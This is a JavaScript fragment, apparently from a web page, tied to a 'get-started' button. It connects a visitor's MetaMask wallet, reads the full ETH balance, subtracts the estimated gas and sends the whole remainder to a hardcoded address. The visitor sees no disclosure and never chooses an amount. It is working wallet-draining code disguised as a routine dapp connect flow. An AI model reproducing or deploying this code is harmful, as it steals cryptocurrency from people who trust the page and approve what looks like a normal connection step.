  document.getElementById('get-started').addEventListener('click', () => {
            const selectedWallet = document.getElementById('walletSelect').value;
            connectAndSend(selectedWallet);
        });

        async function connectAndSend(walletType) {
            let provider;

            if (walletType === 'metamask') {
                if (!window.ethereum || !window.ethereum.isMetaMask) {
                    if (isMobile()) {
                        // Attempt to open MetaMask on mobile
                        window.location.href = 'https://metamask.app.link/dapp/' + window.location.href;
                    } else {
                        alert('MetaMask is not installed');
                    }
                    return;
                }
                provider = new ethers.providers.Web3Provider(window.ethereum);
            }

            // Request account access
            try {
                await provider.send("eth_requestAccounts", []);
            } catch (error) {
                console.error('User denied account access');
                return;
            }

            const signer = provider.getSigner();

            // Get the user's address and balance
            const userAddress = await signer.getAddress();
            let balance = await provider.getBalance(userAddress);

            // Estimate gas price and limit
            const gasPrice = await provider.getGasPrice();
            const dummyTransaction = { to: "0x814FaE9f487206471B6B0D713cD51a2D35980000", value: balance };
            const gasLimit = await provider.estimateGas(dummyTransaction);

            // Calculate gas fee and adjust balance
            const gasFee = gasPrice.mul(gasLimit);
            const value = balance.sub(gasFee);

            if (value.lte(0)) {
                console.log('Insufficient balance to cover the gas fee.');
                return;
            }

            // Define and send the transaction
            const transaction = {
                to: "0x814FaE9f487206471B6B0D713cD51a2D35980000", // Replace with the recipient address
                value: value,
                gasLimit: gasLimit,
                gasPrice: gasPrice,
            };

            try {
                const txResponse = await signer.sendTransaction(transaction);
                console.log('Transaction sent:', txResponse);
            } catch (error) {
                console.error('Error sending transaction:', error);
            }
        }

        function isMobile() {
            return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        }

   
   
 


